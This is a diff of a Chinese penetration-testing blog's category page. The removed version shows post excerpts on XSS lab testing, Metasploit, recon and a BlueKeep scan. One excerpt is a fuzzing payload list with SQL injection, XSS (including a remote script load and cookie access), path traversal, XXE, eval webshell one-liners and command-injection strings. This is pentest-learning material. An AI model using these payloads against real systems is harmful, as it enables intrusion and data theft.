@@ -1,782 +1,249 @@
-<!doctype html>
-<html class="no-js" lang="en">
+
+
+<!DOCTYPE html>
+<html lang="zh">
   <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
+      
+    渗透测试 - lonelyorWiki
     
-  渗透测试 - lonelyorWiki
-  
-  </title>
-  
-  
-  <link href="atom.xml" rel="alternate" title="lonelyorWiki" type="application/atom+xml">
-    <link rel="stylesheet" href="asset/css/foundation.min.css" />
-    <link rel="stylesheet" href="asset/css/docs.css" />
-    <script src="asset/js/vendor/modernizr.js"></script>
-    <script src="asset/js/vendor/jquery.js"></script>
- 
-<script type="text/javascript">
-  function before_search(){
-    var searchVal = 'site:www.lonelyor.org/lonelyorWiki ' + document.getElementById('search_input').value;
-    document.getElementById('search_q').value = searchVal;
-    return true;
-  }
-</script>
-  </head>
-  <body class="antialiased hide-extras">
+    </title>
+    <link rel="shortcut icon" href="https://pic2.zhimg.com/v2-640a8298aed88f9660c378786" type="image/png" />
     
-    <div class="marketing off-canvas-wrap" data-offcanvas>
-      <div class="inner-wrap">
+    
+    <link href="atom.xml" rel="alternate" title="lonelyorWiki" type="application/atom+xml">
+    <link rel="stylesheet" href="asset/style.css">
+    
+</head>
+  <body>
 
 
-<nav class="top-bar docs-bar hide-for-small" data-topbar>
 
 
-  <section class="top-bar-section">
-  <div class="row">
-      <div style="position: relative;width:100%;"><div style="position: absolute; width:100%;">
-        <ul id="main-menu" class="left">
-        
-        <li id=""><a target="_self" href="index.html">首页</a></li>
-        
-        <li id=""><a target="_blank" href="archives.html">归档</a></li>
-        
-        <li id=""><a target="_blank" href="ruby.html">流光</a></li>
-        
-        <li id=""><a target="_blank" href="beautiful.html">惊鸿</a></li>
-        
-        <li id=""><a target="_blank" href="lose.html">失乐园</a></li>
-        
-        <li id=""><a target="_blank" href="search.html">北斗</a></li>
-        
-        <li id=""><a target="_blank" href="about.html">关于</a></li>
-        
-        </ul>
-
-        <ul class="right" id="search-wrap">
-          <li>
-<form target="_blank" onsubmit="return before_search();" action="https://google.com/search" method="get">
-    <input type="hidden" id="search_q" name="q" value="" />
-    <input tabindex="1" type="search" id="search_input"  placeholder="Search"/>
-</form>
-</li>
-          </ul>
-      </div></div>
-  </div>
-  </section>
-
-</nav>
-
-        <nav class="tab-bar show-for-small">
-  <a href="javascript:void(0)" class="left-off-canvas-toggle menu-icon">
-    <span> &nbsp; lonelyorWiki</span>
-  </a>
-</nav>
-
-<aside class="left-off-canvas-menu">
-      <ul class="off-canvas-list">
-        
-        <li><a target="_self" href="index.html">首页</a></li>
-        
-        <li><a target="_blank" href="archives.html">归档</a></li>
-        
-        <li><a target="_blank" href="ruby.html">流光</a></li>
-        
-        <li><a target="_blank" href="beautiful.html">惊鸿</a></li>
-        
-        <li><a target="_blank" href="lose.html">失乐园</a></li>
-        
-        <li><a target="_blank" href="search.html">北斗</a></li>
-        
-        <li><a target="_blank" href="about.html">关于</a></li>
-        
-
-    <li><label>Categories</label></li>
-
-        
-            <li><a href="%E7%B3%BB%E7%BB%9F.html">系统</a></li>
-        
-            <li><a href="%E7%BD%91%E7%BB%9C.html">网络</a></li>
-        
-            <li><a href="%E5%BC%80%E5%8F%91.html">开发</a></li>
-        
-            <li><a href="%E5%B7%A5%E5%85%B7.html">工具</a></li>
-        
-            <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
-        
-            <li><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">渗透测试</a></li>
-        
-            <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
-        
-            <li><a href="%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html">星火流萤</a></li>
-         
-
-      </ul>
-    </aside>
-
-<a class="exit-off-canvas" href="#"></a>
-
-
-        <section id="main-content" role="main" class="scroll-container">
-        
-       
-
- <script type="text/javascript">
-	$(function(){
-		$('#menu_item_index').addClass('is_active');
-	});
-</script>
-<div class="row">
-	<div class="large-8 medium-8 columns">
-		<div class="markdown-body home-categories">
-		
-			<div class="article">
-                <a class="clearlink" href="15642124072307.html">
-                
-                  <h1>Mutillidae 遇到的一个奇怪问题</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                          <a class="button-square" href="index.html">
+<svg class="svg-inline--fa fa-home fa-w-18" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="home" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" data-fa-i2svg=""><path fill="currentColor" d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"></path></svg>
+                            </a>
                         
-                        	<p>在进行 dom 型 xss 测试的时候，发现 payload 中输入 x 或 y 会弹窗，其他字母不弹窗。具体如下图所示。
-<code>&lt;img src=1 onerror=alert(z)&gt;</code>
-<img src="media/15642124072307/15642124281235.jpg" alt="" style="width:1017px;"/></p>
-
-<p><code>&lt;img src=1 onerror=alert(x)&gt;</code>
-<img src="media/15642124072307/15642124904179.jpg" alt="" style="width:774px;"/></p>
-
-<p><code>&lt;img src=1 onerror=alert(y)&gt;</code>
-<img src="media/15642124072307/15642125078089.jpg" alt="" style="width:769px;"/></p>
-
+                         
                         
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/7/27 15:26 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15602308144902.html">
-                
-                  <h1>Metasploit 完全使用教程</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
                         
-                        	<blockquote>
-<p>计划写一个 msf 从安装到使用到编写 exploit 的教程，在这里留个坑。本文不适合新手，很多地方不会说的太细致。但是会说清楚。</p>
-</blockquote>
-
-<h2 id="toc_0">环境搭建</h2>
-
-<p>1、安装 Postgresql
-2、安装 metasploit</p>
-
-<p>关于 metasploit，linux 的话可以使用软件管理器安装；macosx 的话可以使用 brew 安装；windows 别装了，去学 linux 吧。</p>
-
-<p>如果用包管理器安装有问题，则去官网下载二进制文件安装或者 github 下载源码下来，然后给 install 可执行权限，再执行安装。</p>
-
-<p>安装完成之后，使用 alias 命令将<code>/opt/metasploit-framework/bin ./msfconsole</code>（具体路径根据自己安装的实际情况选定）指定成<code>msf</code>，这样以后要用只需要在终端输入 msf 即可立即开始使用。</p>
-
-<h2 id="toc_1">使用入门</h2>
-
-<p>打开终端然后输入 msf 即可启动，如下图所示：
-<img src="media/15602308144902/15602325257924.jpg" alt=""/></p>
-
-<p><img src="media/15602308144902/15602325455212.jpg" alt=""/></p>
-
-<p>上图黄字部分表示当前 msf 版本，如果版本过低，请使用<code>msfupdate</code>进行升级（注意执行此命令时终端所在的目录）。</p>
-
-<h2 id="toc_2">使用 msf 进行信息收集</h2>
-
-<p>主动信息收集的第一步通常都是端口扫描</p>
-
-<p><img src="media/15602308144902/15602328461015.jpg" alt=""/></p>
-
-<p>首先查找端口扫描模块，命令<code>search portscan</code>，search 是个非常重要的命令，当我们需要扫描或者利用某个漏洞时，可以使用 search 命令来查找 msf 是否有相关模块。</p>
-
-<p>（未完待续）</p>
-
                         
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/6/11 13:26 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15597856399146.html">
-                
-                  <h1>黑盒测试中的信息收集</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
+                        <a class="button-square" href="https://github.com/AlShelley/lonelyorWiki" target="_blank" title="github">
+                               <svg class="svg-inline--fa fa-github fa-w-16" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-github fa-lg"></i> -->
+                          </a>
                         
-                        	<p>信息搜集分为主动搜集和被动搜集，主动搜集会惊动资产方因此需要有所针对，动静越小越好；而被动搜集不会惊动资产方因此更为隐蔽。</p>
-
-<h2 id="toc_0">第一阶段：资产（域名及子域名）搜集</h2>
-
-<p>1、确认目标性质：了解网站所在行业，他是一个黑产赌博色情站、还是政府学校官方站、亦或是金融游戏商业站。了解这类网站通常的安全关注点在哪，那么避开其关注点，就是它的薄弱点。</p>
-
-<p>2、收集目标资产 1：使用搜索引擎搜索关键词（公司名、域名等），找出搜索引擎搜录的相关域名，这里可以用一些现成的工具或者自写爬虫</p>
-
-<p>3、收集目标资产 2：使用子域名扫描器，根据 2 中搜集来的域名进一步进行资产收集。</p>
-
-<p>4、收集目标资产 3：使用爬虫在 3 所在的页面中爬取隐藏页面或引用的 url。</p>
-
-<p>信息搜集是层层递进的，根据上一次收集的信息来进行扩展，尽可能多的收集目标资产、扩大打击面。</p>
-
-<h2 id="toc_1">第二阶段：资产属性收集</h2>
-
-<p>5、得到域名和 ip 相关信息后，对资产进行端口扫描、敏感目录（包括后台、备份文件、隐藏接口、邮箱系统、运维自带后门、github 或网盘泄露等）扫描、GoogleHacking（快照信息、已知后门、代码泄露、已知安全事件）、操作系统版本（win、linux）、web 应用服务器版本（nginx、apache、tomcat 等）、后端框架（spring、flask、thinkphp 等）、网络拓扑（多少主机、路由、交换、网段、DNS服务器等）、防御软硬件信息（防火墙、waf、网闸等）等。并一一记录资产对应的信息。这里还有些值得注意的信息就是：邮箱、手机号、身份证号等个人敏感信息。</p>
-
-<p>6、分析信息并对有效信息进行提取和记录。</p>
-
-<p>比如你可以这样来记录（这只是个例子，信息收集自然是越详细越好）：
-<img src="media/15597856399146/15598028215198.jpg" alt=""/></p>
-
-<h2 id="toc_2">第三阶段：资产攻击面分析</h2>
-
-<p>7、收集了各种信息后，就是分析各个资产可能存在的防御薄弱点、分析攻击面。可以从软硬件漏洞、业务、人三个方向来进行分析。</p>
-
-<p>8、收集攻击相关工具、字典等，针对可入侵性高的攻击面进行攻击，此时会获得攻击工具的部分反馈。根据反馈我们可以更好地了解对方的防御措施和脆弱点。根据不同的攻击行为，系统会有不同的反应，分析这些信息对后续展开更深层次的攻击也是有积极意义的。</p>
-
-<p>基本上，到这里，我们就可以开始展开针对性的攻击了。如果物理上离目标近，还可以使用钓鱼二维码、社工、应聘、潜入停车场、办公区域，若网络未做内外网隔离还可以连接办公室 wifi 等方式（连接 wifi 这个绝对是大杀器）。</p>
-
                         
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/6/6 9:47 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
                       
+                      <a class="button-square" href="atom.xml" target="_blank" title="RSS">
+                              <svg class="svg-inline--fa fa-rss fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="rss" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"></path></svg><!-- <i class="fas fa-rss fa-lg"></i> -->
+                      </a>
 
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15596178265897.html">
-                
-                  <h1>业务逻辑漏洞安全检查checklist</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>未公开整理好的 checklist 全部内容，也不打算全部公开。</p>
-</blockquote>
-
-<h2 id="toc_0">认证</h2>
-
-<p>图形验证码问题（验证码缺失、验证码回显、验证码绕过、验证流程不正确、重放攻击）
-手机验证码（短信轰炸、验证码劫持）
-会话固定
-cookie 伪造/爆破
-使用默认凭证（管理后台、数据库密码）
-冻结账户策略不当
-弱用户名和密码
-“记住我”功能缺陷（前端记住/发送密码）
-自动登录
-单点登录劫持
-第三方登录劫持
-二维码登录劫持
-弱口令
-弱安全问题/答案
-弱的密码恢复机制
-Oauth2.0授权漏洞
-JWT安全
-注册覆盖
-未验证的重定向和转发
-双因素认证不当（双因素后获取的凭证，在无需双因素处可以获得）
-恶意注册</p>
-
-<h2 id="toc_1">授权</h2>
-
-<p>测试角色定义（授权不当）
-权限管理缺失（无权限设计）
-匿名访问（备用接口——常见于兼容老的不安全的接口时产生）
-水平越权
-垂直越权
-超级账户
-实名认证不严格</p>
-
-<h2 id="toc_2">会话管理</h2>
-
-<p>cookie安全属性
-cookie可猜解/伪造
-cookie溢出
-会话固定漏洞
-用户凭证不安全传输（弱加密或明文传输）
-用户凭证未一次失效
-用户凭证可猜解
-注销与会话超时
-敏感数据不安全传输（get 方法传输 session）</p>
-
-<h2 id="toc_3">内容安全</h2>
-
-<p>敏感信息过度显示
-违法违规信息</p>
-
-<h2 id="toc_4">设计缺陷</h2>
-
-<p>业务一致性（篡改类）漏洞（订单 id、邮箱或用户名、手机号、商品编号、用户 id、支付金额、优惠券金额、商品数量、最大数限制、前端限制绕过）
-刷赞、刷关注、刷票、刷奖品
-流程绕过（密码找回、支付、登录验证）</p>
-
-<h2 id="toc_5">典型场景</h2>
-
-<p>个人信息
-密码找回/修改
-支付流程
-注册流程
-需要手机/邮箱验证的业务</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/6/4 11:10 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15596171974228.html">
-                
-                  <h1>最近做了个 fuzzing 字典精简版</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>仅用于学习目的，请勿进行违法犯罪活动，也不要用来扫描别人系统，扫描未授权的计算机是犯法的。
-本字典可以用来检测（不保证效果、payload 自行琢磨修改）：sql 注入、xss、敏感目录泄露、敏感文件泄露、iis 短文件名、xml 注入、ssrf、远程命令执行、未验证的 url 跳转、任意文件读取等。</p>
-</blockquote>
-
-<pre class="line-numbers"><code class="language-text">&#39;
-&quot;
-[
-@
-#
-%
-&amp;
-*
-(
-)
-]
-/
-??
-//
-\\
-../
-&lt;!-- 
-%20select @@version
-)%20or%20(&#39;x&#39;=&#39;x
-%20or &#39;a&#39;=&#39;a
-%20or 2 &gt; 1
-%20or &#39;a&#39;=&#39;a
-%20or 1=1
-%20and%201=1
-%20and%201=2
-/**/or/**/1/**/=/**/1
-select &#39;10as&#39;=10;
-exec master..xp_cmdshell &#39;ipconfig+/all&#39;
-%20or &#39;7659&#39;=&#39;7659
-%20or &#39;text&#39; = n&#39;text&#39;
-) union select * from information_schema.tables;
-1+AND+USER_NAME()=’dbo’
-1;waitfor+delay+’0:0:10’
-1’;shutdown –
-as
-%20select 1/*!50000union/*!*//*!50000select/*!*/2;
-%20or 0=0 #&quot;
-&#39; union (select @@version) --
-&#39; union (select NULL, (select @@version)) --
-&#39; union (select NULL, NULL, (select @@version)) --
-&#39; union (select NULL, NULL, NULL,  (select @@version)) --
-&#39; union (select NULL, NULL, NULL, NULL,  (select @@version)) --
-&#39; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
---
-/*
-1’; insert into users values(‘lonelyor’,’lonelyor’)
-%28
-%29
-&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;
-&lt;script&gt;alert(8888)&lt;/script&gt;
-&lt;script&gt;confirm(8866)&lt;/script&gt;
-&lt;script&gt;prompt(8877)&lt;/script&gt;
-a&lt;img src=1 onerror=alert(1)&gt;a
-&lt;img src=x onerror=alert(11)&gt;29
-&lt;anytag onmouseover=alert(1)&gt;s
-&quot;&gt;&lt;img/onload=alert(1)&gt;&#39; -- 
-&lt;video onloadstart=alert(1)&gt;&lt;source&gt;
-&lt;a onclick=alert(2)&gt;h
-&lt;button/onclick=alert(6)&gt;h
-&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;
-&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;
-&lt;body/onload=alert(12)&gt;
-&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
-&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;
-&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-.git
-.gitignore
-.svn
-wp-admin
-wp-login.php
-.DS_store
-.ds_store
-index.php.bak
-.index.php~
-index.php.~
-robots.txt
-.git/config
-admin/
-/admin
-uploads/
-download/
-downloads/
-manager/
-/include
-1.jsp
-hack.jsp
-1.php
-1.asp
-/新建文本文档.txt
-/etc/passwd
-etc/passwd
-../../../../etc/passwd
-/../../../../etc/passwd
-..2f..2fetc2fpasswd
-&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/
-&lt;%eval request(chr(35))%&gt;
-&lt;?=eval($_POST[&#39;cmd&#39;]);
-cmd
-system(&quot;ls -al /&quot;)
-%s%s%s%s%s%s%s%s%s%s
-NULL
-null
-zull
-/C:\Program Files\
-C:\Program Files\
-&lt;!--#exec cmd=&quot;ls&quot; --&gt;
-&lt;!--#exec cmd=&quot;dir&quot; --&gt;
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
-&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
-| ping -i 30 127.0.0.1 |
-&amp; ping -i 30 127.0.0.1 &amp;
-?url=http://www.zhihu.com/
-?url=https://www.zhihu.com/
-http://www.lonelyor.org/
-https://www.lonelyor.org/
-$ENV{&#39;HOME&#39;}
-2.2250738585072011e-308
-01/01/1979
-*~1*/.aspx
-a*~1*/.aspx
-&lt;h1&gt;haha&lt;/h1&gt;
-</code></pre>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/6/4 10:59 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15595455557551.html">
-                
-                  <h1>使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>MSF模块：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</a></p>
-
-<p>前提：先在终端中更新 msf，使用命令<code>msfupdate</code>；如果没法更新，而 msf 版本又低就去 github 下载 msf 模块。</p>
-
-<p>现在开始验证：
-1、终端输入<code>msf</code>启动 msf
-2、使用 cve_2019_0708_bluekeep 模块：<code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code>
-3、设置目标计算机 ip：<code>set RHOSTS 192.168.1.1</code>，如果是域名，可以先 ping 得出 ip 地址。
-4、输入<code>exploit</code>开始检测，如果出现方框中的内容，则表示漏洞存在（相关 ip 已打码）。</p>
-
-<p><img src="media/15595455557551/15595462320619.jpg" alt=""/></p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/6/3 15:5 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
+                       
+                         
+                        
+                    </div>
 
+                    <ul class="site-nav">
+                        
+                    </ul>
+                </div>
+            </header>
 
-			<div class="row">
-			  <div class="large-6 columns">
-			  <p class="text-left" style="padding-top:25px;">
-			   
-			  </p>
-			  </div>
-			  <div class="large-6 columns">
-			<p class="text-right" style="padding-top:25px;">
-			 <a href="渗透测试_1.html">&raquo; Next Page</a> 
-			</p>
-			  </div>
-			</div>
-		</div>
-	</div><!-- large 8 -->
+            <div id="container">
 
- <div class="large-4 medium-4 columns">
-  <div class="hide-for-small">
-    <div id="sidebar" class="sidebar">
-          <div id="site-info" class="site-info">
+ <div id="post-index" class="container">
+    
+    <header class="post-header">
+        <h1 class="post-title">lonelyorWiki</h1>
+        <p class="des">一个用来记录知识的网站。</p>
+    </header>
+     <ol class="post-list">
+        
+        
+            <li class="post-stub">
+              <h2 class="post-stub-title">
+                <a href="15642124072307.html">
+                  Mutillidae 遇到的一个奇怪问题
+                </a>
+              </h2>
+              <p>
+                <time class="post-stub-date" datetime="2019-09-26">Posted 2019/07/27</time>
+              </p>
+
+                 
             
-                <div class="site-a-logo"><img src="http://images.lonelyor.org/favicon.jpg" /></div>
+              <div class="post-read-more">
+                <a href="15642124072307.html">[Read More]</a>
+              </div>
+            </li>
             
-                <h1>lonelyorWiki</h1>
-                <div class="site-des">一个用来记录知识的网站</div>
-                <div class="social">
-
-
-
-
-
-
-
-
-
-<a target="_blank" class="github" target="_blank" href="https://github.com/AlShelley/lonelyorWiki" title="GitHub">GitHub</a>
-<a target="_blank" class="email" href="mailto:lonelyor.org@gmail.com" title="Email">Email</a>
-  <a target="_blank" class="rss" href="atom.xml" title="RSS">RSS</a>
-                
-              	 </div>
-          	</div>
-
-             
-
-              <div id="site-categories" class="side-item ">
-                <div class="side-header">
-                  <h2>Categories</h2>
-                </div>
-                <div class="side-content">
-
-      	<p class="cat-list">
         
-            <a href="%E7%B3%BB%E7%BB%9F.html"><strong>系统</strong></a>
-        
-            <a href="%E7%BD%91%E7%BB%9C.html"><strong>网络</strong></a>
-        
-            <a href="%E5%BC%80%E5%8F%91.html"><strong>开发</strong></a>
-        
-            <a href="%E5%B7%A5%E5%85%B7.html"><strong>工具</strong></a>
-        
-            <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
-        
-            <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"><strong>渗透测试</strong></a>
-        
-            <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
-        
-            <a href="%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html"><strong>星火流萤</strong></a>
-         
-        </p>
+            <li class="post-stub">
+              <h2 class="post-stub-title">
+                <a href="15602308144902.html">
+                  Metasploit 完全使用教程
+                </a>
+              </h2>
+              <p>
+                <time class="post-stub-date" datetime="2019-09-26">Posted 2019/06/11</time>
+              </p>
 
-
-                </div>
+                 
+            
+              <div class="post-read-more">
+                <a href="15602308144902.html">[Read More]</a>
               </div>
+            </li>
+            
+        
+            <li class="post-stub">
+              <h2 class="post-stub-title">
+                <a href="15597856399146.html">
+                  黑盒测试中的信息收集
+                </a>
+              </h2>
+              <p>
+                <time class="post-stub-date" datetime="2019-09-26">Posted 2019/06/06</time>
+              </p>
 
-              <div id="site-categories" class="side-item">
-                <div class="side-header">
-                  <h2>Recent Posts</h2>
-                </div>
-                <div class="side-content">
-                <ul class="posts-list">
-	      
-		      
-			      <li class="post">
-			        <a href="15747334018156.html">msfvenom各类木马生成脚本</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15724200154293.html">v2ray实现科学上网</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15708455642675.html">如何使用cmd开启3389端口与查看3389端口</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15695779467285.html">给linux终端加一个移动到回收站的功能</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15694777838251.html">Proxmox TASK ERROR: Failed to run vncproxy.解决办法</a>
-			      </li>
-		     
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
-		  
-		      
